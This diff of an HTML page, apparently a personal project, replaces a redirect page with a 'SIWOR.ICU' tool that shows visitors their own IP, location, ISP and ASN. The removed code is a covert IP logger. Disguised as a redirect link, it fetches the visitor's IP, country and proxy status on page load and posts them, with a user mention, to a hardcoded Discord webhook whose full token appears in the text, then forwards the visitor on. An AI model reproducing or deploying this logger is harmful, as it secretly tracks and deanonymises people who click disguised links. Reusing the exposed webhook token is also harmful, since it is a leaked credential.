@@ -3,113 +3,819 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>SIWOR.ICU</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            text-align: center;
+        :root {
+            --bg-color: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            --text-color: #333;
+            --card-bg: white;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            --table-header-bg: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --table-header-color: white;
+            --table-border: #eee;
+            --table-text: #555;
+            --censored-bg: #f0f0f0;
+            --settings-bg: rgba(255, 255, 255, 0.98);
+            --settings-text: #333;
+            --search-bg: rgba(255, 255, 255, 0.9);
+            --search-border: #ddd;
         }
-        .error {
-            font-size: 24px;
-            color: red;
-            margin-top: 50px;
+        
+        .dark-mode {
+            --bg-color: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            --text-color: #f0f0f0;
+            --card-bg: #1e293b;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            --table-header-bg: linear-gradient(135deg, #4b6cb7 0%, #182848 100%);
+            --table-header-color: #f8fafc;
+            --table-border: #334155;
+            --table-text: #e2e8f0;
+            --censored-bg: #334155;
+            --settings-bg: rgba(23, 42, 70, 0.98);
+            --settings-text: #f0f0f0;
+            --search-bg: rgba(30, 41, 59, 0.9);
+            --search-border: #4a5568;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            transition: background 0.5s ease, color 0.3s ease;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            animation: fadeIn 0.8s ease-out;
+            position: relative;
+        }
+        
+        .location-text {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            opacity: 0;
+            animation: slideUp 0.6s ease-out 0.3s forwards;
+        }
+        
+        .ip-table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            background: var(--card-bg);
+            box-shadow: var(--card-shadow);
+            border-radius: 12px;
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.6s ease-out 0.5s forwards;
+            transition: background 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .table-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--table-header-bg);
+            padding: 10px 15px;
+        }
+        
+        .table-title {
+            color: var(--table-header-color);
+            font-weight: 500;
+            margin: 0;
+        }
+        
+        .search-container {
+            position: relative;
+            width: 150px;
+            transition: width 0.3s ease;
+        }
+        
+        .search-container:focus-within {
+            width: 180px;
+        }
+        
+        .search-input {
+            width: 100%;
+            padding: 6px 30px 6px 10px;
+            border-radius: 20px;
+            border: 1px solid var(--search-border);
+            background: var(--search-bg);
+            color: var(--text-color);
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+        
+        .search-input:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(102, 126, 234, 0.3);
+        }
+        
+        .search-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-color);
+            pointer-events: none;
+        }
+        
+        .ip-table td {
+            padding: 15px;
+            border-bottom: 1px solid var(--table-border);
+            color: var(--table-text);
+            transition: border-color 0.3s ease, color 0.3s ease;
+        }
+        
+        .ip-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .flag-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .flag {
+            width: 30px;
+            height: 22px;
+            border-radius: 3px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .dark-mode-toggle, .settings-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: var(--card-shadow);
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+        
+        .dark-mode-toggle {
+            right: 70px;
+        }
+        
+        .dark-mode-toggle:hover, .settings-toggle:hover {
+            transform: scale(1.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .dark-mode-toggle svg, .settings-toggle svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-color);
+            transition: fill 0.3s ease;
+        }
+        
+        .ip-address {
+            cursor: pointer;
+            position: relative;
+            user-select: none;
+        }
+        
+        .ip-address.censored {
+            background: var(--censored-bg);
+            color: transparent;
+            text-shadow: 0 0 8px rgba(0,0,0,0.5);
+            border-radius: 4px;
+        }
+        
+        .ip-address.censored::after {
+            content: "Click to reveal";
+            position: absolute;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: var(--text-color);
+            text-shadow: none;
+        }
+        
+        .settings-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--settings-bg);
+            color: var(--settings-text);
+            padding: 30px;
+            z-index: 100;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            overflow-y: auto;
+            backdrop-filter: blur(5px);
+        }
+        
+        .settings-panel.open {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .settings-content {
+            max-width: 500px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+            position: relative;
+            border: 1px solid var(--table-border);
+        }
+        
+        .settings-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--table-border);
+        }
+        
+        .settings-title {
+            margin: 0;
+            font-size: 1.5rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .dark-mode .settings-title {
+            background: linear-gradient(135deg, #4b6cb7 0%, #182848 100%);
+        }
+        
+        .settings-group {
+            margin-bottom: 25px;
+            background: linear-gradient(to bottom, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid var(--table-border);
+        }
+        
+        .settings-group h3 {
+            margin-top: 0;
+            margin-bottom: 18px;
+            font-size: 1.1rem;
+            color: var(--text-color);
+        }
+        
+        .setting-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px dashed var(--table-border);
+        }
+        
+        .setting-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 26px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+        
+        .close-settings {
+            background: none;
+            border: none;
+            font-size: 1.8rem;
+            cursor: pointer;
+            color: var(--settings-text);
+            transition: transform 0.3s ease;
+            padding: 5px;
+        }
+        
+        .close-settings:hover {
+            transform: rotate(90deg);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .ip-address.censored::after {
+                content: "Tap to reveal";
+            }
+            
+            .dark-mode-toggle {
+                right: 60px;
+            }
+            
+            .settings-panel {
+                padding: 15px;
+            }
+            
+            .settings-content {
+                padding: 20px;
+            }
+            
+            .search-container {
+                width: 120px;
+            }
+            
+            .search-container:focus-within {
+                width: 140px;
+            }
         }
     </style>
 </head>
 <body>
+    <button class="dark-mode-toggle" id="darkModeToggle" aria-label="Toggle dark mode">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1-8.313-12.454z"/>
+        </svg>
+    </button>
+    
+    <button class="settings-toggle" id="settingsToggle" aria-label="Settings">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.53c.04-.32.07-.64.07-.97 0-.33-.03-.66-.07-1l2.11-1.63c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.31-.61-.22l-2.49 1c-.52-.39-1.06-.73-1.69-.98l-.37-2.65A.506.506 0 0 0 14 2h-4c-.25 0-.46.18-.5.42l-.37 2.65c-.63.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64L4.57 11c-.04.34-.07.67-.07 1 0 .33.03.65.07.97l-2.11 1.66c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1.01c.52.4 1.06.74 1.69.99l.37 2.65c.04.24.25.42.5.42h4c.25 0 .46-.18.5-.42l.37-2.65c.63-.26 1.17-.59 1.69-.99l2.49 1.01c.22.08.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.66z"/>
+        </svg>
+    </button>
+    
+    <div class="container">
+        <div class="location-text" id="locationText"></div>
+        <table class="ip-table" id="ipTable">
+            <thead>
+                <tr>
+                    <th colspan="2">
+                        <div class="table-header">
+                            <h2 class="table-title">Connection Information</h2>
+                            <div class="search-container">
+                                <input type="text" class="search-input" id="ipSearch" placeholder="Search IP..." />
+                                <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <circle cx="11" cy="11" r="8"></circle>
+                                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                                </svg>
+                            </div>
+                        </div>
+                    </th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr data-field="ip">
+                    <td>IP Address</td>
+                    <td id="ipAddress" class="ip-address censored"></td>
+                </tr>
+                <tr data-field="country">
+                    <td>Country</td>
+                    <td class="flag-container">
+                        <img id="countryFlag" class="flag" src="https://surfshark.com/website/_next/public/global/flags/GB.svg" alt="Flag">
+                        <span id="countryName"></span>
+                    </td>
+                </tr>
+                <tr data-field="flag">
+                    <td>Flag</td>
+                    <td id="flagEmoji"></td>
+                </tr>
+                <tr data-field="city">
+                    <td>City</td>
+                    <td id="city"></td>
+                </tr>
+                <tr data-field="region">
+                    <td>Region</td>
+                    <td id="region"></td>
+                </tr>
+                <tr data-field="isp">
+                    <td>ISP</td>
+                    <td id="isp"></td>
+                </tr>
+                <tr data-field="asn">
+                    <td>ASN</td>
+                    <td id="asn"></td>
+                </tr>
+                <tr data-field="continent">
+                    <td>Continent</td>
+                    <td id="continent"></td>
+                </tr>
+                <tr data-field="country_code">
+                    <td>Country Code</td>
+                    <td id="countryCode"></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <div class="settings-panel" id="settingsPanel">
+        <div class="settings-content">
+            <div class="settings-header">
+                <h2 class="settings-title">Settings</h2>
+                <button class="close-settings" id="closeSettings">&times;</button>
+            </div>
+            
+            <div class="settings-group">
+                <h3>Privacy Settings</h3>
+                <div class="setting-item">
+                    <label for="publicMode">Public Mode (show IP by default)</label>
+                    <label class="switch">
+                        <input type="checkbox" id="publicMode">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+            
+            <div class="settings-group">
+                <h3>Display Options</h3>
+                <div class="setting-item">
+                    <label for="showIP">Show IP Address</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showIP" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showCountry">Show Country</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showCountry" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showFlag">Show Flag</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showFlag" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showCity">Show City</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showCity" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showRegion">Show Region</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showRegion" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showISP">Show ISP</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showISP" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showASN">Show ASN</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showASN">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showContinent">Show Continent</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showContinent">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="showCountryCode">Show Country Code</label>
+                    <label class="switch">
+                        <input type="checkbox" id="showCountryCode">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1322345788462071875/OrpRYnyIugZkioBPX5Nm1WaE8_LDh0dza2u8dNnWo5DY8ql0qG7ajjxf1MI3XCeA0aco'; // Replace with your Discord webhook URL
-
-        // Helper function to extract query params
-        function getQueryParams(url) {
-            const params = new URL(url).searchParams;
-            const queryParams = {};
-            for (const [key, value] of params.entries()) {
-                queryParams[key] = value;
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load settings from cookies
+            function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
             }
-            return queryParams;
-        }
-
-        // Decrypt a URL (simulate UUID decryption for simplicity)
-        function decryptUUID(encryptedUUID) {
-            // Replace this logic with your real decryption logic
-            const base64Decoded = atob(encryptedUUID); // Simulates a simple base64 decryption
-            return base64Decoded;
-        }
-
-        async function handleRedirect() {
-            // Extract query parameters
-            const queryParams = getQueryParams(window.location.href);
-            const queryKeys = Object.keys(queryParams);
-
-            if (queryKeys.length === 0) {
-                // Show 404 error if no query parameters
-                document.body.innerHTML = '<div class="error">404 Not Found</div>';
-                return;
+            
+            function setCookie(name, value, days = 365) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                document.cookie = `${name}=${value}; expires=${date.toUTCString()}; path=/`;
             }
-
-            // Assume the first parameter is the numeric ID, and the second is the encrypted UUID
-            const numericId = queryKeys[0];
-            const encryptedUUID = queryParams[numericId];
-            let redirectURL;
-
-            try {
-                // Attempt to decrypt the UUID
-                redirectURL = decryptUUID(encryptedUUID);
-            } catch {
-                document.body.innerHTML = '<div class="error">404 Not Found</div>';
-                return;
+            
+            // Initialize settings
+            const settings = {
+                darkMode: getCookie('darkMode') === 'true',
+                publicMode: getCookie('publicMode') === 'true',
+                showIP: getCookie('showIP') !== 'false',
+                showCountry: getCookie('showCountry') !== 'false',
+                showFlag: getCookie('showFlag') !== 'false',
+                showCity: getCookie('showCity') !== 'false',
+                showRegion: getCookie('showRegion') !== 'false',
+                showISP: getCookie('showISP') !== 'false',
+                showASN: getCookie('showASN') === 'true',
+                showContinent: getCookie('showContinent') === 'true',
+                showCountryCode: getCookie('showCountryCode') === 'true'
+            };
+            
+            // Apply settings
+            if (settings.darkMode) {
+                document.body.classList.add('dark-mode');
             }
-
-            try {
-                const response = await fetch('https://freeipapi.com/api/json');
-
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
+            
+            document.getElementById('publicMode').checked = settings.publicMode;
+            document.getElementById('showIP').checked = settings.showIP;
+            document.getElementById('showCountry').checked = settings.showCountry;
+            document.getElementById('showFlag').checked = settings.showFlag;
+            document.getElementById('showCity').checked = settings.showCity;
+            document.getElementById('showRegion').checked = settings.showRegion;
+            document.getElementById('showISP').checked = settings.showISP;
+            document.getElementById('showASN').checked = settings.showASN;
+            document.getElementById('showContinent').checked = settings.showContinent;
+            document.getElementById('showCountryCode').checked = settings.showCountryCode;
+            
+            // Toggle dark mode
+            const darkModeToggle = document.getElementById('darkModeToggle');
+            darkModeToggle.addEventListener('click', function() {
+                settings.darkMode = !settings.darkMode;
+                document.body.classList.toggle('dark-mode', settings.darkMode);
+                setCookie('darkMode', settings.darkMode);
+            });
+            
+            // Settings panel toggle
+            const settingsPanel = document.getElementById('settingsPanel');
+            const settingsToggle = document.getElementById('settingsToggle');
+            const closeSettings = document.getElementById('closeSettings');
+            
+            settingsToggle.addEventListener('click', function() {
+                settingsPanel.classList.add('open');
+            });
+            
+            closeSettings.addEventListener('click', function() {
+                settingsPanel.classList.remove('open');
+            });
+            
+            // Save settings
+            function updateSetting(settingName) {
+                settings[settingName] = document.getElementById(settingName).checked;
+                setCookie(settingName, settings[settingName]);
+                toggleField(settingName.replace('show', '').toLowerCase(), settings[settingName]);
+                
+                if (settingName === 'publicMode') {
+                    updateIPCensorship();
                 }
-
-                const data = await response.json();
-
-                // Prepare the embed payload for Discord
-                const embed = {
-                    content: `<@${numericId}>`, // Mentions the user outside the embed
-                    embeds: [
-                        {
-                            title: "IP Information",
-                            fields: [
-                                { name: "IP Version", value: data.ipVersion || 'N/A', inline: true },
-                                { name: "IP Address", value: data.ipAddress || 'N/A', inline: true },
-                                { name: "Country Name", value: data.countryName || 'N/A', inline: true },
-                                { name: "Continent", value: data.continent || 'N/A', inline: true },
-                                { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
-                                { name: "Redirect URL", value: redirectURL, inline: false },
-                                { name: "Matching Code", value: encryptedUUID, inline: false }
-                            ],
-                            color: 3447003 // Optional: Set a color for the embed
-                        }
-                    ]
-                };
-
-                // Send the data to the Discord webhook
-                await fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embed)
-                });
-
-                // Redirect to the decrypted URL
-                window.location.href = redirectURL;
-
-            } catch (error) {
-                document.body.innerHTML = `<div class="error">Failed to redirect: ${error.message}</div>`;
             }
-        }
-
-        // Automatically handle the redirect when the page loads
-        window.onload = handleRedirect;
+            
+            document.getElementById('publicMode').addEventListener('change', () => updateSetting('publicMode'));
+            document.getElementById('showIP').addEventListener('change', () => updateSetting('showIP'));
+            document.getElementById('showCountry').addEventListener('change', () => updateSetting('showCountry'));
+            document.getElementById('showFlag').addEventListener('change', () => updateSetting('showFlag'));
+            document.getElementById('showCity').addEventListener('change', () => updateSetting('showCity'));
+            document.getElementById('showRegion').addEventListener('change', () => updateSetting('showRegion'));
+            document.getElementById('showISP').addEventListener('change', () => updateSetting('showISP'));
+            document.getElementById('showASN').addEventListener('change', () => updateSetting('showASN'));
+            document.getElementById('showContinent').addEventListener('change', () => updateSetting('showContinent'));
+            document.getElementById('showCountryCode').addEventListener('change', () => updateSetting('showCountryCode'));
+            
+            function toggleField(field, show) {
+                const rows = document.querySelectorAll(`tr[data-field="${field}"]`);
+                rows.forEach(row => {
+                    row.style.display = show ? '' : 'none';
+                });
+            }
+            
+            // Initialize fields
+            toggleField('ip', settings.showIP);
+            toggleField('country', settings.showCountry);
+            toggleField('flag', settings.showFlag);
+            toggleField('city', settings.showCity);
+            toggleField('region', settings.showRegion);
+            toggleField('isp', settings.showISP);
+            toggleField('asn', settings.showASN);
+            toggleField('continent', settings.showContinent);
+            toggleField('country_code', settings.showCountryCode);
+            
+            // IP address censorship
+            const ipAddressElement = document.getElementById('ipAddress');
+            let censorIP = !settings.publicMode;
+            
+            function updateIPCensorship() {
+                censorIP = !settings.publicMode;
+                ipAddressElement.classList.toggle('censored', censorIP);
+            }
+            
+            updateIPCensorship();
+            
+            // Toggle censorship on click (mobile)
+            ipAddressElement.addEventListener('click', function() {
+                if (window.innerWidth <= 480) { // Mobile devices
+                    toggleCensorship();
+                }
+            });
+            
+            // Toggle censorship on Ctrl key (desktop)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey) {
+                    toggleCensorship();
+                }
+            });
+            
+            function toggleCensorship() {
+                censorIP = !censorIP;
+                ipAddressElement.classList.toggle('censored', censorIP);
+            }
+            
+            // Parse CSV data
+            function parseCSV(csvText) {
+                const lines = csvText.split('\n');
+                const headers = lines[0].split(',');
+                const result = [];
+                
+                for (let i = 1; i < lines.length; i++) {
+                    if (!lines[i]) continue;
+                    
+                    const obj = {};
+                    const currentline = lines[i].split(',');
+                    
+                    for (let j = 0; j < headers.length; j++) {
+                        obj[headers[j].trim()] = currentline[j] ? currentline[j].trim() : '';
+                    }
+                    
+                    result.push(obj);
+                }
+                
+                return result;
+            }
+            
+            // Fetch IP data
+            function fetchIPData(ip = '') {
+                const loadingText = document.getElementById('locationText');
+                loadingText.textContent = 'Loading...';
+                
+                fetch(`https://nyanc4tt.xyz/api/iplookup?ip=${ip}`)
+                    .then(response => response.json())
+                    .then(ipData => {
+                        // Update IP address
+                        ipAddressElement.textContent = ipData.ip;
+                        
+                        // Update the table data
+                        const countryCode = ipData.country_code.toUpperCase();
+                        document.getElementById('countryFlag').src = 
+                            `https://surfshark.com/website/_next/public/global/flags/${countryCode}.svg`;
+                        document.getElementById('countryName').textContent = ipData.country;
+                        document.getElementById('flagEmoji').textContent = ipData.flag_emoji;
+                        document.getElementById('city').textContent = ipData.city;
+                        document.getElementById('region').textContent = ipData.region;
+                        document.getElementById('isp').textContent = ipData.isp;
+                        document.getElementById('asn').textContent = ipData.asn;
+                        document.getElementById('continent').textContent = ipData.continent;
+                        document.getElementById('countryCode').textContent = ipData.country_code;
+                        
+                        // Fetch CSV greetings data
+                        return fetch('https://q94f.glitch.me/greetings.csv')
+                            .then(response => response.text())
+                            .then(csvText => {
+                                const greetingsData = parseCSV(csvText);
+                                
+                                // Find all greetings for the country flag
+                                const countryGreetings = greetingsData.filter(
+                                    item => item.flag === ipData.flag_emoji
+                                );
+                                
+                                // Select greeting
+                                let greeting = "Hello";
+                                let wavingEmoji = "👋";
+                                
+                                if (countryGreetings.length > 0) {
+                                    // Pick random greeting if multiple exist
+                                    const randomGreeting = countryGreetings[
+                                        Math.floor(Math.random() * countryGreetings.length)
+                                    ];
+                                    greeting = randomGreeting.greeting;
+                                }
+                                
+                                // Update location text with greeting and emojis
+                                const locationText = document.getElementById('locationText');
+                                locationText.innerHTML = `
+                                    ${greeting} ${wavingEmoji}, 
+                                    We see you are in ${ipData.city}, ${ipData.country} ${ipData.flag_emoji}
+                                `;
+                            });
+                    })
+                    .catch(error => {
+                        console.error('Error fetching data:', error);
+                        document.getElementById('locationText').textContent = 
+                            'Error loading data. Please try another IP.';
+                        
+                        // Set default values if there's an error
+                        ipAddressElement.textContent = 'Error';
+                        document.getElementById('countryName').textContent = 'Error';
+                        document.getElementById('flagEmoji').textContent = 'Error';
+                        document.getElementById('city').textContent = 'Error';
+                        document.getElementById('region').textContent = 'Error';
+                        document.getElementById('isp').textContent = 'Error';
+                        document.getElementById('asn').textContent = 'Error';
+                        document.getElementById('continent').textContent = 'Error';
+                        document.getElementById('countryCode').textContent = 'Error';
+                    });
+            }
+            
+            // Initial fetch
+            fetchIPData();
+            
+            // IP search functionality
+            const ipSearch = document.getElementById('ipSearch');
+            ipSearch.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    const ip = this.value.trim();
+                    if (ip) {
+                        fetchIPData(ip);
+                    }
+                }
+            });
+        });
     </script>
 </body>
 </html>
